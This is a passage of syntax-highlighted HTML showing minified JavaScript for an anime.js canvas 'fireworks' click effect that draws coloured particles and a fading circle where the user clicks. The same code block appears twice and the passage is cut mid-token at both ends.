class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token 